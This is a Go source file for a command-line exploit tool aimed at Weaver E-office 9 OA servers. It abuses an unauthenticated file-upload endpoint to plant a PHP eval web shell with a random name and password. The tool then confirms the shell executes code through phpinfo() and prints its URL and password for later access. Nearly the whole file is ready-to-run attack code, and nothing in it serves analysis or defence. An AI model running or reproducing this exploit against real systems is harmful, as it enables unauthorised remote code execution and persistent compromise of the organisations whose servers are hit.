package main
import (
    "bytes"
    "crypto/tls"
    "fmt"
    "github.com/hpifu/go-kit/hflag"
    "github.com/liushuochen/gotable"
    "github.com/liushuochen/gotable/table"
    "github.com/thanhpk/randstr"
    "io/ioutil"
    "mime/multipart"
    "net/http"
    "net/textproto"
    "os"
    "regexp"
    "strconv"
    "strings"
)
func main() {
    hosts := office9Getflag()
    filename, password := shellconfig()
    exploit(hosts, filename, password)
}
func shellconfig() (filename, password string) {
    return randstr.Hex(6), randstr.Hex(8)
}
func eoffice9cli() *http.Client {
    cli := &http.Client{
        Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
    }
    return cli
}
func tableFormat() (table *table.Table) {
    create, err := gotable.Create("shell连接地址", "shell连接密码")
    if err != nil {
        panic(err)
    }
    return create
}
func office9Getflag() string {
    hflag.AddFlag("target", "泛微OA-E-office9 目标地址", hflag.Required(), hflag.Shorthand("t"))
    if err := hflag.Parse(); err != nil {
        fmt.Println(hflag.Usage())
        os.Exit(0)
    }
    return hflag.GetString("target")
}
func exploit(target, filename, password string) {
    cli := eoffice9cli()
    vulURL := strings.Replace(target+"/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save", "//E-mobile", "/E-mobile", 1)
    buffer := &bytes.Buffer{}
    writer := multipart.NewWriter(buffer)
    headers := make(textproto.MIMEHeader) // 设置一个可修改的请求头
    headers.Set("Content-Disposition", fmt.Sprintf(`form-data; name="upload_quwan"; filename="%s"`, filename+".php."))
    // 设置文件名和 data name
    headers.Set("Content-Type", "application/octet-stream") // 修改content type
    _, _ = writer.CreatePart(headers)                       //  搞一个part
    buffer.WriteString("<?php eval($_REQUEST[\"" + password + "\"]);?>")
    _ = writer.Close()
    _, _ = writer.CreateFormFile("file", "")
    _ = writer.Close()
    request, err := http.NewRequest(http.MethodPost, vulURL, strings.NewReader(buffer.String()))
    if err != nil {
        fmt.Println(err)
    }
    request.Header.Set("User-Agent", "QAXNB-Pyth0000000000000000000000000000000")
    request.Header.Set("Content-Type", writer.FormDataContentType())
    request.Header.Set("Connection", "Close")
    request.Header.Set("Content-Length", strconv.Itoa(len(buffer.String())))
    do, err := cli.Do(request)
    if err != nil {
        fmt.Println(err)
    }
    defer func() {
        _ = do.Body.Close()
    }()
    all, err := ioutil.ReadAll(do.Body)
    if err != nil {
        fmt.Println(err)
    }
    compile := regexp.MustCompile(`attachment\\/\d{1,10}`)
    allString := compile.FindAllString(string(all), 1)
    if strings.Contains(string(all), "Error") == true {
        fmt.Println("This Site CVE-2023-253 IS Fixed")
        return
    }
    replace := strings.Replace(allString[0], "\\/", "/", 1)
    fullURL := target + replace + "/" + filename + ".php"
    resp, err := http.Get(fullURL + "?" + password + "=phpinfo();")
    if err != nil {
        fmt.Println(err)
    }
    if resp.StatusCode != http.StatusOK {
        fmt.Println("Exploit Failed !")
        return
    }
    defer func() {
        _ = resp.Body.Close()
    }()
    readAll, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        fmt.Println(err)
    }
    if len(string(readAll)) > 10000 {
        tables := tableFormat()
        _ = tables.AddRow([]string{fullURL, password})
        fmt.Println(tables)
    }
}
